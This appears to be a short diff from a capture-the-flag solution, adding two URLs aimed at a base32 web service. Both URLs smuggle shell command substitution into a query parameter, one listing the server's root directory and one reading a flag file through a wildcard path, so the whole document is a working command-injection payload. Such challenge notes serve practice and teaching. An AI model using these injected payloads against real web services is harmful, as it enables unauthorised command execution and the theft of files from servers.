@@ -1,0 +1,2 @@
+find file: https://base32.splitline.tw/?string=$(base32%20%3C%3C%3C%20$(ls%20/))
+get flag: https://base32.splitline.tw/?string=$(base32%20%3C%20/fla?_Vc1lT7Z6ZRvDtFnZU437BOgITml7IlLn)
